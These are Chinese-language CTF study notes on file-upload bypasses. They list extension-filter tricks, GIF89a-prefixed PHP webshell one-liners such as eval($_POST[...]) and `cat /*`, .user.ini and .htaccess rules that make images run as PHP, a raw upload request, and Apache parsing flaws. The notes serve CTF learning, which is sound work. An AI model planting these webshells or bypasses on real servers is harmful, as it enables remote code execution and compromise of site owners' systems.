文件上传

[TOC]

###### 尝试特殊解析漏洞：

php3,php5,phtml ；

 大小写绕过：PHP,pHP；

 点绕过：php.； 

空格绕过：php空格；

::$$DATA绕过：shell.php::$$DATA；

双后缀：shell.phphpp；

单循环绕过：shell.php. .；

假文件名绕过：shell.php/.

```
.php4
.php5
.phtml
.phpx
.jpg.php
1.php/.
.htaccess
.user.ini
pht, phpt, phtml, php3,php4,php5,php6
```

短标签：

```
GIF89a
<script language="php">eval($_POST['shell']);</script> 

//或者
GIF89a
<script language="php">eval($_POST['shell']);
show_source("/flag");
</script>

```

upload/ea97fa3cc6ff6c26f05398cdcc7148af/muma.jpg

```
#define height 1
#define width 1
GIF89a
 <?= @eval($_POST['a']);?>
```

###### .user.ini，1

[[suctf 2019\]checkin | NSSCTF](https://www.nssctf.cn/problem/756)

解：

[[SUCTF 2019\]CheckIn（.user.ini）_checkin .user.ini-CSDN博客](https://blog.csdn.net/qq_44657899/article/details/104682702?ops_request_misc=&request_id=&biz_id=102&utm_term=[suctf 2019]checkin&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-104682702.142^v96^pc_search_result_base1&spm=1018.2226.3001.4187)

这道题是说，上传一个图片马，然后还有个.htassess文件，把jpg,当作php来执行。.user.ini包含一下代码

```
GIF89a
auto_prepend_file=1.jpg
```

这个函数的意思是在在执行文件前自动包含1.jpg，而1.jpg忧被当作php执行，那么就可以了。

好像不上传.htaccess也可以.

```
//AddType application/x-httpd-php .png
SetHandler application/x-httpd-php
这个才是最牛的



<FilesMatch "evil.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

md，这也行

![1701916633008](C:\Users\86176\AppData\Roaming\Typora\typora-user-images\1701916633008.png)

```
Referer: http://node4.anna.nssctf.cn:28059/
Upgrade-Insecure-Requests: 1

-----------------------------76210565836549306893686179906
Content-Disposition: form-data; name="file"; filename="muma.pht"
Content-Type: image/jpeg

BM<?=`cat /*`;
-----------------------------76210565836549306893686179906
Content-Disposition: form-data; name="submit"
```

最short的一句话木马

/var/www/html/upload/796a923b91d15f2d7bf457391d2b4d8d/muma.jpg

###### .user.ini配置文件攻击，2

先上传一个.user.ini配置文件，auto_prepend_file=a.txt

再上传a,txt会自动在每个文件打开时自动包含进去。

###### Apache解析漏洞

1.多后缀文件解析漏洞
在以上Apache配置下，当使用AddType（非之前的AddHandler）时，多后缀文件会从最右后缀开始识别，如果后缀不存在对应的MIME type或Handler，则会继续往左识别后缀，直到后缀有对应的MIME type或Handler。x.php.xxx文件由于xxx后缀没有对应的handler或mime type，这时往左识别出PHP后缀，就会将该文件交给application/x-httpd-php处理

2.Apache CVE-2017-15715漏洞
在HTTPD 2.4.0到2.4.29版本中，FilesMatch指令正则中“$”能够匹配到换行符，可能导致黑名单绕过

zip上传。

这个来在N1BOOK里面，在zip中写入穿越目录，可以将一句话木马写到根目录

#### os.path.join()

[[NISACTF 2022\]babyupload wp_ctf nsb uploader-CSDN博客](https://blog.csdn.net/Leaf_initial/article/details/130118702)